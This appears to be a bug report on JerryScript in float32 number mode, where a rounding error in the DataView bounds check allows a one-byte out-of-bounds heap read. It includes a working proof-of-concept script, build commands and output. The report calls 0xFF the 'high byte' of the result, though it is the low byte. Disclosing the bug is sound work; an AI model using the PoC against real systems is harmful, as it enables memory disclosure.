JerryScript's DataView bounds check uses the `ecma_number_t` type for comparison. When compiled in 32-bit float mode (`JERRY_NUMBER_TYPE_FLOAT64=0`), `ecma_number_t` is defined as C `float` (32-bit). At values ≥ 2^24 (16777216), float32's ULP (Unit in the Last Place) is 2, causing the addition `get_index + element_size` to round to an incorrect value, making the check `16777216.0f > 16777216.0f` evaluate to FALSE — bypassing the bounds protection.
Create `j1_poc.js`
```
var ab = new ArrayBuffer(16777216);
var dv = new DataView(ab);

// getUint32(16777213): 16777213.0f + 4.0f = 16777216.0f (rounding error)
// Check: 16777216 > 16777216 = FALSE -> BYPASS -> reads bytes 16777213-16777216
// Byte 16777216 is 1 byte past the buffer -> OOB
try {
    var v = dv.getUint32(16777213);
    print("getUint32(16777213) = " + v);
} catch(e) {
    print("getUint32(16777213) threw: " + e);
}

// Normal access (should succeed)
try {
    var v = dv.getUint8(0);
    print("getUint8(0) = " + v);
} catch(e) {
    print("getUint8(0) threw: " + e);
}

// True OOB (no bypass, should throw RangeError)
try {
    var v = dv.getUint32(16777216);
    print("getUint32(16777216) = " + v);
} catch(e) {
    print("getUint32(16777216) correctly threw: " + e.name);
}
```
Build with float32 mode JerryScript
```
cd jerryscript-master
mkdir build && cd build
cmake .. -G "MinGW Makefiles" \
    -DJERRY_NUMBER_TYPE_FLOAT64=OFF \
    -DJERRY_BUILTIN_DATE=OFF \
    -DJERRY_GLOBAL_HEAP_SIZE=32768 \
    -DCMAKE_C_FLAGS="-DJERRY_NUMBER_TYPE_FLOAT64=0 \
                     -DJERRY_BUILTIN_DATE=0 \
                     -DJERRY_GLOBAL_HEAP_SIZE=32768"
cmake --build .
```
Run PoC
```
bin\jerry.exe ..\j1_poc.js
```
`getUint32(16777213) = 255 (0xFF)` is the key evidence. In the return value 0x000000FF, the high byte 0xFF is heap garbage read from past the buffer (uninitialized buffer defaults to 0x00). This conclusively proves the program read memory outside the ArrayBuffer boundary.
<img width="903" height="141" alt="image" src="https://github.com/user-attachments/assets/a4557646-2736-47d7-8469-8ac61c4937ab" />

